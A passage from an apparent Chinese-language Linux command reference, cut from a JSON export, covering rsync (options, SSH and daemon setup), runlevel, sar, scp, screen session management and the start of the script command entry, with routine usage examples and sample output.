保持文件属组信息。\n-D, --devices 保持设备文件信息。\n-t, --times 保持文件时间信息。\n-S, --sparse 对稀疏文件进行特殊处理以节省DST的空间。\n-n, --dry-run现实哪些文件将被传输。\n-w, --whole-file 拷贝文件，不进行增量检测。\n-x, --one-file-system 不要跨越文件系统边界。\n-B, --block-size=SIZE 检验算法使用的块尺寸，默认是700字节。\n-e, --rsh=command 指定使用rsh、ssh方式进行数据同步。\n--rsync-path=PATH 指定远程服务器上的rsync命令所在路径信息。\n-C, --cvs-exclude 使用和CVS一样的方法自动忽略文件，用来排除那些不希望传输的文件。\n--existing 仅仅更新那些已经存在于DST的文件，而不备份那些新创建的文件。\n--delete 删除那些DST中SRC没有的文件。\n--delete-excluded 同样删除接收端那些被该选项指定排除的文件。\n--delete-after 传输结束以后再删除。\n--ignore-errors 及时出现IO错误也进行删除。\n--max-delete=NUM 最多删除NUM个文件。\n--partial 保留那些因故没有完全传输的文件，以是加快随后的再次传输。\n--force 强制删除目录，即使不为空。\n--numeric-ids 不将数字的用户和组id匹配为用户名和组名。\n--timeout=time ip超时时间，单位为秒。\n-I, --ignore-times 不跳过那些有同样的时间和长度的文件。\n--size-only 当决定是否要备份文件时，仅仅察看文件大小而不考虑文件时间。\n--modify-window=NUM 决定文件是否时间相同时使用的时间戳窗口，默认为0。\n-T --temp-dir=DIR 在DIR中创建临时文件。\n--compare-dest=DIR 同样比较DIR中的文件来决定是否需要备份。\n-P 等同于 --partial。\n--progress 显示备份过程。\n-z, --compress 对备份的文件在传输时进行压缩处理。\n--exclude=PATTERN 指定排除不需要传输的文件模式。\n--include=PATTERN 指定不排除而需要传输的文件模式。\n--exclude-from=FILE 排除FILE中指定模式的文件。\n--include-from=FILE 不排除FILE指定模式匹配的文件。\n--version 打印版本信息。\n--address 绑定到特定的地址。\n--config=FILE 指定其他的配置文件，不使用默认的rsyncd.conf文件。\n--port=PORT 指定其他的rsync服务端口。\n--blocking-io 对远程shell使用阻塞IO。\n-stats 给出某些文件的传输状态。\n--progress 在传输时显示传输过程。\n--log-format=formAT 指定日志文件格式。\n--password-file=FILE 从FILE中得到密码。\n--bwlimit=KBPS 限制I/O带宽，KBytes per second。\n-h, --help 显示帮助信息。\n```\n\n### 实例\n\n **SSH方式**\n\n首先在服务端启动ssh服务：\n\n```shell\nservice sshd start\n启动 sshd： [确定]\n```\n\n **使用rsync进行同步**\n\n接下来就可以在客户端使用rsync命令来备份服务端上的数据了，SSH方式是通过系统用户来进行备份的，如下：\n\n```shell\nrsync -vzrtopg --progress -e ssh --delete work@172.16.78.192:/www/* /databack/experiment/rsync\nwork@172.16.78.192's password:\nreceiving file list ...\n5 files to consider\ntest/\na\n0 100% 0.00kB/s 527:35:41 (1, 20.0% of 5)\nb\n67 100% 65.43kB/s 0:00:00 (2, 40.0% of 5)\nc\n0 100% 0.00kB/s 527:35:41 (3, 60.0% of 5)\ndd\n100663296 100% 42.22MB/s 0:00:02 (4, 80.0% of 5)\nsent 96 bytes received 98190 bytes 11563.06 bytes/sec\ntotal size is 100663363 speedup is 1024.19\n```\n\n上面的信息描述了整个的备份过程，以及总共备份数据的大小。\n\n **后台服务方式**\n\n启动rsync服务，编辑`/etc/xinetd.d/rsync`文件，将其中的`disable=yes`改为`disable=no`，并重启xinetd服务，如下：\n\n```shell\nvi /etc/xinetd.d/rsync\n\n#default: off\n# description: The rsync server is a good addition to an ftp server, as it \\\n# allows crc checksumming etc.\nservice rsync {\ndisable = no\nsocket_type = stream\nwait = no\nuser = root\nserver = /usr/bin/rsync\nserver_args = --daemon\nlog_on_failure += USERID\n}\n```\n\n```shell\n/etc/init.d/xinetd restart\n停止 xinetd： [确定]\n启动 xinetd： [确定]\n```\n\n创建配置文件，默认安装好rsync程序后，并不会自动创建rsync的主配置文件，需要手工来创建，其主配置文件为“/etc/rsyncd.conf”，创建该文件并插入如下内容：\n\n```shell\nvi /etc/rsyncd.conf\n\nuid=root\ngid=root\nmax connections=4\nlog file=/var/log/rsyncd.log\npid file=/var/run/rsyncd.pid\nlock file=/var/run/rsyncd.lock\nsecrets file=/etc/rsyncd.passwd\nhosts deny=172.16.78.0/22\n\n[www]\ncomment= backup web\npath=/www\nread only = no\nexclude=test\nauth users=work\n```\n\n创建密码文件，采用这种方式不能使用系统用户对客户端进行认证，所以需要创建一个密码文件，其格式为“username:password”，用户名可以和密码可以随便定义，最好不要和系统帐户一致，同时要把创建的密码文件权限设置为600，这在前面的模块参数做了详细介绍。\n\n```shell\necho \"work:abc123\" > /etc/rsyncd.passwd\nchmod 600 /etc/rsyncd.passwd\n```\n\n备份，完成以上工作，现在就可以对数据进行备份了，如下：\n\n```shell\nrsync -avz --progress --delete work@172.16.78.192::www /databack/experiment/rsync\n\nPassword:\nreceiving file list ...\n6 files to consider\n./ files...\na\n0 100% 0.00kB/s 528:20:41 (1, 50.0% of 6)\nb\n67 100% 65.43kB/s 0:00:00 (2, 66.7% of 6)\nc\n0 100% 0.00kB/s 528:20:41 (3, 83.3% of 6)\ndd\n100663296 100% 37.49MB/s 0:00:02 (4, 100.0% of 6)\nsent 172 bytes received 98276 bytes 17899.64 bytes/sec\ntotal size is 150995011 speedup is 1533.75\n```\n\n恢复，当服务器的数据出现问题时，那么这时就需要通过客户端的数据对服务端进行恢复，但前提是服务端允许客户端有写入权限，否则也不能在客户端直接对服务端进行恢复，使用rsync对数据进行恢复的方法如下：\n\n```shell\nrsync -avz --progress /databack/experiment/rsync/ work@172.16.78.192::www\n\nPassword:\nbuilding file list ...\n6 files to consider\n./\na\nb\n67 100% 0.00kB/s 0:00:00 (2, 66.7% of 6)\nc\nsent 258 bytes received 76 bytes 95.43 bytes/sec\ntotal size is 150995011 speedup is 452080.87\n```\n\n**将源目录同步到目标目录**\n\n```shell\n$ rsync -r source destination\n```\n\n上面命令中，`-r` 表示递归，即包含子目录。注意，`-r`是必须的，否则 `rsync` 运行不会成功。`source` 目录表示源目录，`destination` 表示目标目录。\n\n**多个文件或目录同步**\n\n```shell\n$ rsync -r source1 source2 destination\n```\n\n上面命令中，`source1`、`source2` 都会被同步到 `destination` 目录。\n\n**同步元信息**\n\n`-a` 参数可以替代 `-r`，除了可以递归同步以外，还可以同步元信息（比如修改时间、权限等）。由于 `rsync` 默认使用文件大小和修改时间决定文件是否需要更新，所以 `-a` 比 `-r` 更有用。下面的用法才是常见的写法。\n\n```shell\n$ rsync -a source destination\n```\n\n目标目录 `destination` 如果不存在，`rsync` 会自动创建。执行上面的命令后，源目录 `source` 被完整地复制到了目标目录 `destination` 下面，即形成了 `destination/source` 的目录结构。\n\n如果只想同步源目录 `source` 里面的内容到目标目录 `destination` ，则需要在源目录后面加上斜杠。\n\n```shell\n$ rsync -a source/ destination\n```\n\n上面命令执行后，`source` 目录里面的内容，就都被复制到了 `destination` 目录里面，并不会在 `destination` 下面创建一个 `source` 子目录。\n\n\n**模拟执行的结果**\n\n如果不确定 `rsync` 执行后会产生什么结果，可以先用 `-n` 或 `--dry-run` 参数模拟执行的结果。\n\n```shell\n$ rsync -anv source/ destination\n```\n\n上面命令中，`-n` 参数模拟命令执行的结果，并不真的执行命令。`-v` 参数则是将结果输出到终端，这样就可以看到哪些内容会被同步。\n\n**目标目录成为源目录的镜像副本**\n\n默认情况下，`rsync` 只确保源目录的所有内容（明确排除的文件除外）都复制到目标目录。它不会使两个目录保持相同，并且不会删除文件。如果要使得目标目录成为源目录的镜像副本，则必须使用 `--delete` 参数，这将删除只存在于目标目录、不存在于源目录的文件。\n\n```shell\n$ rsync -av --delete source/ destination\n```\n\n上面命令中，`--delete` 参数会使得 `destination` 成为 `source` 的一个镜像。\n\n\n**排除文件**\n\n有时，我们希望同步时排除某些文件或目录，这时可以用--exclude参数指定排除模式。\n\n```shell\n$ rsync -av --exclude='*.txt' source/ destination\n# 或者\n$ rsync -av --exclude '*.txt' source/ destination\n```\n\n上面命令排除了所有 `TXT` 文件。\n\n注意，`rsync` 会同步以\"点\"开头的隐藏文件，如果要排除隐藏文件，可以这样写 `--exclude=\".*\"`。\n\n如果要排除某个目录里面的所有文件，但不希望排除目录本身，可以写成下面这样。\n\n```shell\n$ rsync -av --exclude 'dir1/*' source/ destination\n```\n\n多个排除模式，可以用多个 `--exclude` 参数。\n\n```shell\n$ rsync -av --exclude 'file1.txt' --exclude 'dir1/*' source/ destination\n```\n\n多个排除模式也可以利用 Bash 的大扩号的扩展功能，只用一个 `--exclude` 参数。\n\n```shell\n$ rsync -av --exclude={'file1.txt','dir1/*'} source/ destination\n```\n\n如果排除模式很多，可以将它们写入一个文件，每个模式一行，然后用 `--exclude-from` 参数指定这个文件。\n\n```shell\n$ rsync -av --exclude-from='exclude-file.txt' source/ destination\n```\n\n**指定必须同步的文件模式**\n\n`--include` 参数用来指定必须同步的文件模式，往往与 `--exclude` 结合使用。\n\n```shell\n$ rsync -av --include=\"*.txt\" --exclude='*' source/ destination\n```\n\n上面命令指定同步时，排除所有文件，但是会包括 `TXT` 文件。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","rsync"]},{"title":"【Linux 命令】runlevel","url":"/linux-command/runlevel/","content":"\n打印当前Linux系统的运行等级\n\n## 补充说明\n\n**runlevel命令** 用于打印当前Linux系统的运行等级。\n\n###  语法\n\n```shell\nrunlevel\n```\n\n###  知识扩展\n\nlinux操作系统自从开始启动至启动完毕需要经历几个不同的阶段，这几个阶段就叫做runlevel，同样，当linux操作系统关闭时也要经历另外几个不同的runlevel，下面我们就准备详细介绍一下runlevel，并向您展示一些小技巧来让您的linux系统避免不必要的重启动。\n\nrunlevel可以认为是系统状态，形象一点，您可以认为runlevel有点象微软的windows操作系统中的Normal，safemode，和command prompt only。进入每个runlevel都需要启动或关闭相应的一系列服务(services)，这些服务(services)以初始化脚本的方式放置于目录`/etc/rc.d/rc?.d/`或者`/etc/rc?.d`下面（?代表runlevel的对应序号）。\n\n在大多数的linux发行版本中，通常有8个runlevel：\n\n```shell\n0 停机\n1 单用户模式\n2 多用户，没有 NFS\n3 完全多用户模式\n4 没有用到\n5 图形界面\n6 重新启动\nS s Single user mode\n```\n\n多数的桌面的linux系统缺省的runlevel是5，用户登陆时是图形界面，而多数的服务器版本的linux系统缺省的runlevel是3，用户登陆时是字符界面，runlevel 1和2除了调试之外很少使用，runlevel s和S并不是直接给用户使用，而是用来为Single user mode作准备。\n\nlinux的运行模式比起windows的启动模式的优势在于：你可以在系统空闲时使用init命令切换你现在使用的runlevel，另外，当你关闭或者启动linux系统时你已经不知不觉中切换你的runlevel，系统关机进程需要调用runlevel(0或6)来关闭所有正在运行中的进程。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","runlevel"]},{"title":"【Linux 命令】sar","url":"/linux-command/sar/","content":"\n系统运行状态统计工具\n\n## 补充说明\n\n**sar命令** 是Linux下系统运行状态统计工具，它将指定的操作系统状态计数器显示到标准输出设备。sar工具将对系统当前的状态进行取样，然后通过计算数据和比例来表达系统的当前运行状态。它的特点是可以连续对系统取样，获得大量的取样数据。取样数据和分析的结果都可以存入文件，使用它时消耗的系统资源很小。\n\n###  语法\n\n```shell\nsar(选项)(参数)\n```\n\n###  选项\n\n```shell\n-A：显示所有的报告信息；\n-b：显示I/O速率；\n-B：显示换页状态；\n-c：显示进程创建活动；\n-d：显示每个块设备的状态；\n-e：设置显示报告的结束时间；\n-f：从指定文件提取报告；\n-i：设状态信息刷新的间隔时间；\n-P：报告每个CPU的状态；\n-R：显示内存状态；\n-u：显示CPU利用率；\n-v：显示索引节点，文件和其他内核表的状态；\n-w：显示交换分区状态；\n-x：显示给定进程的状态。\n```\n\n###  参数\n\n*   间隔时间：每次报告的间隔时间（秒）；\n*   次数：显示报告的次数。\n\n###  实例\n\n **察看内存和交换空间的使用率：** \n\n```shell\nsar -r\nLinux 2.4.20-8 (www.jsdig.com)    20130503  \n12:00:01 AM kbmemfree kbmemused  %memused \nkbmemshrd kbbuffers  kbcached  \n12:10:00 AM    240468   1048252     81.34    \n0    133724    485772  \n12:20:00 AM    240508   1048212     81.34   \n0    134172    485600  \n…  \n08:40:00 PM    934132    354588     27.51    \n0     26080    185364  \nAverage:       324346    964374     74.83  \n0     96072    467559 \n```\n\nkbmemfree与kbmemused字段分别显示内存的未使用与已使用空间，后面跟着的是已使用空间的百分比（%memused字段）。kbbuffers与kbcached字段分别显示缓冲区与系统全域的数据存取量，单位为KB。\n\n **观察系统部件10分钟，并对数据进行排序：** \n\n```shell\nsar -o temp 60 10\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","sar"]},{"title":"【Linux 命令】scp","url":"/linux-command/scp/","content":"\n加密的方式在本地主机和远程主机之间复制文件\n\n## 补充说明\n\n**scp命令** 用于在Linux下进行远程拷贝文件的命令，和它类似的命令有cp，不过cp只是在本机进行拷贝不能跨服务器，而且scp传输是加密的。可能会稍微影响一下速度。当你服务器硬盘变为只读read only system时，用scp可以帮你把文件移出来。另外，scp还非常不占资源，不会提高多少系统负荷，在这一点上，rsync就远远不及它了。虽然 rsync比scp会快一点，但当小文件众多的情况下，rsync会导致硬盘I/O非常高，而scp基本不影响系统正常使用。\n\n###  语法\n\n```shell\nscp(选项)(参数)\n```\n\n###  选项\n\n```shell\n-1：使用ssh协议版本1；\n-2：使用ssh协议版本2；\n-4：使用ipv4；\n-6：使用ipv6；\n-B：以批处理模式运行；\n-C：使用压缩；\n-F：指定ssh配置文件；\n-i：identity_file 从指定文件中读取传输时使用的密钥文件（例如亚马逊云pem），此参数直接传递给ssh；\n-l：指定宽带限制；\n-o：指定使用的ssh选项；\n-P：指定远程主机的端口号；\n-p：保留文件的最后修改时间，最后访问时间和权限模式；\n-q：不显示复制进度；\n-r：以递归方式复制。\n```\n\n###  参数\n\n* 源文件：指定要复制的源文件。\n* 目标文件：目标文件。格式为`user@host：filename`（文件名为目标文件的名称）。\n\n###  实例\n\n从远程复制到本地的scp命令与上面的命令雷同，只要将从本地复制到远程的命令后面2个参数互换顺序就行了。\n\n **从远程机器复制文件到本地目录** \n\n```shell\nscp root@10.10.10.10:/opt/soft/nginx-0.5.38.tar.gz /opt/soft/\n```\n\n从10.10.10.10机器上的`/opt/soft/`的目录中下载nginx-0.5.38.tar.gz 文件到本地`/opt/soft/`目录中。\n\n**从亚马逊云复制OpenVPN到本地目录** \n\n```shell\nscp -i amazon.pem ubuntu@10.10.10.10:/usr/local/openvpn_as/etc/exe/openvpn-connect-2.1.3.110.dmg openvpn-connect-2.1.3.110.dmg\n```\n从10.10.10.10机器上下载openvpn安装文件到本地当前目录来。\n\n **从远程机器复制到本地** \n\n```shell\nscp -r root@10.10.10.10:/opt/soft/mongodb /opt/soft/\n```\n\n从10.10.10.10机器上的`/opt/soft/`中下载mongodb目录到本地的`/opt/soft/`目录来。\n\n **上传本地文件到远程机器指定目录** \n\n```shell\nscp /opt/soft/nginx-0.5.38.tar.gz root@10.10.10.10:/opt/soft/scptest\n# 指定端口 2222\nscp -rp -P 2222 /opt/soft/nginx-0.5.38.tar.gz root@10.10.10.10:/opt/soft/scptest\n```\n\n复制本地`/opt/soft/`目录下的文件nginx-0.5.38.tar.gz到远程机器10.10.10.10的`opt/soft/scptest`目录。\n\n **上传本地目录到远程机器指定目录** \n\n```shell\nscp -r /opt/soft/mongodb root@10.10.10.10:/opt/soft/scptest\n```\n\n上传本地目录`/opt/soft/mongodb`到远程机器10.10.10.10上`/opt/soft/scptest`的目录中去。\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","scp"]},{"title":"【Linux 命令】screen","url":"/linux-command/screen/","content":"\n用于命令行终端切换\n\n## 补充说明\n\n**Screen** 是一款由GNU计划开发的用于命令行终端切换的自由软件。用户可以通过该软件同时连接多个本地或远程的命令行会话，并在其间自由切换。GNU Screen可以看作是窗口管理器的命令行界面版本。它提供了统一的管理多个会话的界面和相应的功能。\n\n **会话恢复** \n\n只要Screen本身没有终止，在其内部运行的会话都可以恢复。这一点对于远程登录的用户特别有用——即使网络连接中断，用户也不会失去对已经打开的命令行会话的控制。只要再次登录到主机上执行screen -r就可以恢复会话的运行。同样在暂时离开的时候，也可以执行分离命令detach，在保证里面的程序正常运行的情况下让Screen挂起（切换到后台）。这一点和图形界面下的VNC很相似。\n\n **多窗口** \n\n在Screen环境下，所有的会话都独立的运行，并拥有各自的编号、输入、输出和窗口缓存。用户可以通过快捷键在不同的窗口下切换，并可以自由的重定向各个窗口的输入和输出。Screen实现了基本的文本操作，如复制粘贴等；还提供了类似滚动条的功能，可以查看窗口状况的历史记录。窗口还可以被分区和命名，还可以监视后台窗口的活动。 会话共享 Screen可以让一个或多个用户从不同终端多次登录一个会话，并共享会话的所有特性（比如可以看到完全相同的输出）。它同时提供了窗口访问权限的机制，可以对窗口进行密码保护。\n\nGNU's Screen 官方站点：http://www.gnu.org/software/screen/\n\n###  语法\n\n```shell\n# screen -AmRvx -[ls -wipe][-d <作业名称>][-h <行数>][-r <作业名称>][-s ][-S <作业名称>]\n```\n\n###  选项\n\n```shell\n-A 　将所有的视窗都调整为目前终端机的大小。\n-d <作业名称> 　将指定的screen作业离线。\n-h <行数> 　指定视窗的缓冲区行数。\n-m 　即使目前已在作业中的screen作业，仍强制建立新的screen作业。\n-r <作业名称> 　恢复离线的screen作业。\n-R 　先试图恢复离线的作业。若找不到离线的作业，即建立新的screen作业。\n-s 　指定建立新视窗时，所要执行的shell。\n-S <作业名称> 　指定screen作业的名称。\n-v 　显示版本信息。\n-x 　恢复之前离线的screen作业。\n-ls或--list 　显示目前所有的screen作业。\n-wipe 　检查目前所有的screen作业，并删除已经无法使用的screen作业。\n```\n\n###  常用screen参数\n\n```shell\nscreen -S yourname -> 新建一个叫yourname的session\nscreen -ls -> 列出当前所有的session\nscreen -r yourname -> 回到yourname这个session\nscreen -d yourname -> 远程detach某个session\nscreen -d -r yourname -> 结束当前session并回到yourname这个session\n```\n\n在每个screen session 下，所有命令都以 ctrl+a(C-a) 开始。\n\n```shell\nC-a ? -> 显示所有键绑定信息\nC-a c -> 创建一个新的运行shell的窗口并切换到该窗口\nC-a n -> Next，切换到下一个 window \nC-a p -> Previous，切换到前一个 window \nC-a 0..9 -> 切换到第 0..9 个 window\nCtrl+a [Space] -> 由视窗0循序切换到视窗9\nC-a C-a -> 在两个最近使用的 window 间切换 \nC-a x -> 锁住当前的 window，需用用户密码解锁\nC-a d -> detach，暂时离开当前session，将目前的 screen session (可能含有多个 windows) 丢到后台执行，并会回到还没进 screen 时的状态，此时在 screen session 里，每个 window 内运行的 process (无论是前台/后台)都在继续执行，即使 logout 也不影响。 \nC-a z -> 把当前session放到后台执行，用 shell 的 fg 命令则可回去。\nC-a w -> 显示所有窗口列表\nC-a t -> time，显示当前时间，和系统的 load \nC-a k -> kill window，强行关闭当前的 window\nC-a  -> 进入 copy mode，在 copy mode 下可以回滚、搜索、复制就像用使用 [vi 一样\n    C-b Backward，PageUp \n    C-f Forward，PageDown \n    H(大写) High，将光标移至左上角 \n    L Low，将光标移至左下角 \n    0 移到行首 \n    $ 行末 \n    w forward one word，以字为单位往前移 \n    b backward one word，以字为单位往后移 \n    Space 第一次按为标记区起点，第二次按为终点 \n    Esc 结束 copy mode \nC-a ] -> paste，把刚刚在 copy mode 选定的内容贴上\n```\n\n###  使用 screen\n\n **安装screen** \n\n流行的Linux发行版（例如Red Hat Enterprise Linux）通常会自带screen实用程序，如果没有的话，可以从GNU screen的官方网站下载。\n\n```shell\n[root@TS-DEV ~]# yum install screen\n[root@TS-DEV ~]# rpm -qa|grep screen\nscreen-4.0.3-4.el5\n[root@TS-DEV ~]#\n```\n\n **创建一个新的窗口** \n\n安装完成后，直接敲命令screen就可以启动它。但是这样启动的screen会话没有名字，实践上推荐为每个screen会话取一个名字，方便分辨：\n\n```shell\n[root@TS-DEV ~]# screen -S david \n```\n\nscreen启动后，会创建第一个窗口，也就是窗口No. 0，并在其中打开一个系统默认的shell，一般都会是bash。所以你敲入命令screen之后，会立刻又返回到命令提示符，仿佛什么也没有发生似的，其实你已经进入Screen的世界了。当然，也可以在screen命令之后加入你喜欢的参数，使之直接打开你指定的程序，例如：\n\n```shell\n[root@TS-DEV ~]# screen vi david.txt\n```\n\nscreen创建一个执行vi david.txt的单窗口会话，退出vi 将退出该窗口/会话。\n\n **查看窗口和窗口名称** \n\n打开多个窗口后，可以使用快捷键C-a w列出当前所有窗口。如果使用文本终端，这个列表会列在屏幕左下角，如果使用X环境下的终端模拟器，这个列表会列在标题栏里。窗口列表的样子一般是这样：\n\n```shell\n0$ bash  1-$ bash  2*$ bash  \n```\n\n这个例子中我开启了三个窗口，其中*号表示当前位于窗口2，-号表示上一次切换窗口时位于窗口1。\n\nScreen默认会为窗口命名为编号和窗口中运行程序名的组合，上面的例子中窗口都是默认名字。练习了上面查看窗口的方法，你可能就希望各个窗口可以有不同的名字以方便区分了。可以使用快捷键C-a A来为当前窗口重命名，按下快捷键后，Screen会允许你为当前窗口输入新的名字，回车确认。\n\n **会话分离与恢复** \n\n你可以不中断screen窗口中程序的运行而暂时断开（detach）screen会话，并在随后时间重新连接（attach）该会话，重新控制各窗口中运行的程序。例如，我们打开一个screen窗口编辑/tmp/david.txt文件：\n\n```shell\n[root@TS-DEV ~]# screen vi /tmp/david.txt\n```\n\n之后我们想暂时退出做点别的事情，比如出去散散步，那么在screen窗口键入C-a d，Screen会给出detached提示：\n\n暂时中断会话\n\n\n半个小时之后回来了，找到该screen会话：\n\n```shell\n[root@TS-DEV ~]# screen -ls\n```\n\n重新连接会话：\n\n```shell\n[root@TS-DEV ~]# screen -r 12865\n```\n\n一切都在。\n\n当然，如果你在另一台机器上没有分离一个Screen会话，就无从恢复会话了。这时可以使用下面命令强制将这个会话从它所在的终端分离，转移到新的终端上来：\n\n\n **清除dead 会话** \n\n如果由于某种原因其中一个会话死掉了（例如人为杀掉该会话），这时screen -list会显示该会话为dead状态。使用screen -wipe命令清除该会话：\n\n\n **关闭或杀死一个Screen会话** \n\n正常情况下，当你退出一个窗口中最后一个程序（通常是bash）后，这个窗口就关闭了。另一个关闭窗口的方法是使用`ctrl`+`a` 键，然后按下`k`键，最后当提示你是否要杀死这个会话时按下`y`键，这个快捷键会杀死当前的窗口，同时也将杀死这个窗口中正在运行的进程。\n\n如果一个Screen会话中最后一个窗口被关闭了，那么整个Screen会话也就退出了，screen进程会被终止。\n\n除了依次退出/杀死当前Screen会话中所有窗口这种方法之外，还可以使用快捷键C-a :，然后输入quit命令退出Screen会话。需要注意的是，这样退出会杀死所有窗口并退出其中运行的所有程序。其实C-a :这个快捷键允许用户直接输入的命令有很多，包括分屏可以输入split等，这也是实现Screen功能的一个途径，不过个人认为还是快捷键比较方便些。\n\n此外，这里再介绍另外一种快速杀死一个Screen会话的命令：\n\n```shell\n[root@TS-DEV ~]# screen -ls   #列出存在的会话\n[root@TS-DEV ~]# screen -XS \"会话id或者名称\" quit\n```\n\n**示例：**\n\n```shell\n[root@TS-DEV ~]# screen -ls\nThere are screens on:\n\t11235.test\t(01/25/2021 03:35:31 PM)\t(Detached)\n1 Sockets in /run/screen/S-root.\n[root@TS-DEV ~]# screen -XS 11235 quit\n#或者\n[root@TS-DEV ~]# screen -XS test quit\n```\n\n###  screen 高级应用 \n\n **会话共享** \n\n还有一种比较好玩的会话恢复，可以实现会话共享。假设你在和朋友在不同地点以相同用户登录一台机器，然后你创建一个screen会话，你朋友可以在他的终端上命令：\n\n```shell\n[root@TS-DEV ~]# screen -x\n```\n\n这个命令会将你朋友的终端Attach到你的Screen会话上，并且你的终端不会被Detach。这样你就可以和朋友共享同一个会话了，如果你们当前又处于同一个窗口，那就相当于坐在同一个显示器前面，你的操作会同步演示给你朋友，你朋友的操作也会同步演示给你。当然，如果你们切换到这个会话的不同窗口中去，那还是可以分别进行不同的操作的。\n\n **会话锁定与解锁** \n\nScreen允许使用快捷键C-a s锁定会话。锁定以后，再进行任何输入屏幕都不会再有反应了。但是要注意虽然屏幕上看不到反应，但你的输入都会被Screen中的进程接收到。快捷键C-a q可以解锁一个会话。\n\n也可以使用C-a x锁定会话，不同的是这样锁定之后，会话会被Screen所属用户的密码保护，需要输入密码才能继续访问这个会话。\n\n **发送命令到screen会话** \n\n在Screen会话之外，可以通过screen命令操作一个Screen会话，这也为使用Screen作为脚本程序增加了便利。关于Screen在脚本中的应用超出了入门的范围，这里只看一个例子，体会一下在会话之外对Screen的操作：\n\n```shell\n[root@TS-DEV ~]# screen -S sandy -X screen ping www.baidu.com\n```\n\n这个命令在一个叫做sandy的screen会话中创建一个新窗口，并在其中运行ping命令。\n\n **屏幕分割** \n\n现在显示器那么大，将一个屏幕分割成不同区域显示不同的Screen窗口显然是个很酷的事情。可以使用快捷键C-a S将显示器水平分割，Screen 4.00.03版本以后，也支持垂直分屏，快捷键是C-a |。分屏以后，可以使用C-a <tab>在各个区块间切换，每一区块上都可以创建窗口并在其中运行进程。\n\n可以用C-a X快捷键关闭当前焦点所在的屏幕区块，也可以用C-a Q关闭除当前区块之外其他的所有区块。关闭的区块中的窗口并不会关闭，还可以通过窗口切换找到它。\n\n **C/P模式和操作** \n\nscreen的另一个很强大的功能就是可以在不同窗口之间进行复制粘贴了。使用快捷键C-a <Esc>或者C-a [可以进入copy/paste模式，这个模式下可以像在vi中一样移动光标，并可以使用空格键设置标记。其实在这个模式下有很多类似vi的操作，譬如使用/进行搜索，使用y快速标记一行，使用w快速标记一个单词等。关于C/P模式下的高级操作，其文档的这一部分有比较详细的说明。\n\n一般情况下，可以移动光标到指定位置，按下空格设置一个开头标记，然后移动光标到结尾位置，按下空格设置第二个标记，同时会将两个标记之间的部分储存在copy/paste buffer中，并退出copy/paste模式。在正常模式下，可以使用快捷键C-a ]将储存在buffer中的内容粘贴到当前窗口。\n\n\n **更多screen功能** \n\n同大多数UNIX程序一样，GNU Screen提供了丰富强大的定制功能。你可以在Screen的默认两级配置文件/etc/screenrc和$HOME/.screenrc中指定更多，例如设定screen选项，定制绑定键，设定screen会话自启动窗口，启用多用户模式，定制用户访问权限控制等等。如果你愿意的话，也可以自己指定screen配置文件。\n\n以多用户功能为例，screen默认是以单用户模式运行的，你需要在配置文件中指定multiuser on 来打开多用户模式，通过acl*（acladd,acldel,aclchg...）命令，你可以灵活配置其他用户访问你的screen会话。更多配置文件内容请参考screen的man页。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","screen"]},{"title":"【Linux 命令】script","url":"/linux-command/script/","content":"\n记录终端会话的所有操作\n\n## 补充说明\n\n**script** 用于在终端会话中，记录用户的所有操作和命令的输出信息。简而言之，记录终端会话发生的一切信息，如同一台终端录像机。例如，用户在输入某条命令时，字符的键入和删除也都会被记录。用户在终端的所有操作、终端的回显等信息会被以 `raw` 格式存储在日志文件，称为终端数据文件。命令的时间信息会被单独以另一种结构储存为日志文件，称为时间日志文件。使用命令`exit`或者快捷键`Ctrl + D`停止记录。\n\n\n###  语法\n\n```shell\nscript(选项)(参数)\n```\n\n###  选项\n\n```shell\n-a, --append              # 对终端会话的操作信息，以追加方式写入文件（保留原文件内容）\n-c, --command command     # 只运行 command 命令而不打开交互终端。相当于开启 script ，执行 command ，再退出 script\n                          # command 可以是任意能够在终端会话执行的命令\n-e, --return              # 返回子进程的退出状态码\n-f, --flush               # 每次终端的内容发生变动，立马写入日志文件\n--force                   # 允许默认输出终端数据文件为符号链接\n-o, --output-limit size   # 限制终端数据文件和时间日志文件的大小，当文件大小达到此限制就会退出子进程\n                          # size 的单位可以设置为：KiB(=1024)、KB(=1000)、MiB(1024*1024)、MB(=1000*1000)\n                          # 同理还支持 GiB TiB PiB EiB ZiB YiB GB TB PB EB ZB YB\n-q, --quiet               # 安静模式。启动和退出script命令不显示任何提示\n-t[file], --timing[=file] # 输出时间日志信息到标准错误(stderr)或者文件\n-V, --version             # 显示版本信息并退出\n-h, --help                # 显示帮助文本并退出\n```\n\n###  参数\n\n* 终端数据文件：设置存储终端数据信息的文件名称\n\n###  实例\n\n```shell\nscript                             # 开启记录，默认会在当前目录创建名称为 typescript 的文件来保存终端数据文件\nscript command.log                 # 开启记录，在当前目录创建名称为 command.log 的文件来保存终端数据文件\nscript -t 2>time.file command.log  # 开启记录，在当前目录创建名称为 command.log 的文件来保存终端数据文件\n                                   # 在当前目录创建名称为 time.file 的文件来保存时间日志文件\n```\n\n **以追加模式记录终端信息** \n\n```shell\nzfb@localhost:~$ script -t 2>time.file -a -f command.log\nScript started, file is command.log\nzfb@localhost:~$ echo \"hello, world\"\nhello, world\nzfb@localhost:~$ echo $(date \"+%Y-%m-%d %H:%M:%S\")\n2020-12-23 20:48:46\nzfb@localhost:~$ echo \"Bye\"\nBye\nzfb@localhost:~$ ls -al\ntotal 20\ndrwxr-xr-x  2 zfb zfb 4096 Dec 23 20:48 .\ndrwxr-xr-x 37 zfb zfb 4096 Dec 23 20:49 ..\n-rw-r--r--  1 zfb zfb    0 Dec 23 19:03 a.txt\n-rw-r--r--  1 zfb zfb   12 Dec 23 19:04 b.txt\n-rw-r--r--  1 zfb zfb 2744 Dec 23 20:49 command.log\n-rw-r--r--  1 zfb zfb  790 Dec 23 20:49 time.file\nzfb@localhost:~$ exit\nScript done, file is command.log\nzfb@localhost:~$\n```\n\n然后，用户可以查看终端数据文件，使用方法如下  \n\n```shell\nzfb@localhost:~$ cat command.log\nScript started on 2020-12-23 20:48:25+08:00 [TERM=\"xterm-256color\" TTY=\"/dev/pts/0\" COLUMNS=\"75\" LINES=\"30\"]\nzfb@localhost:~$ echo \"hello, world\"\nhello, world\nzfb@localhost:~$ echo $(date \"+%Y-%m-%d %H:%M:%S\")\n2020-12-23 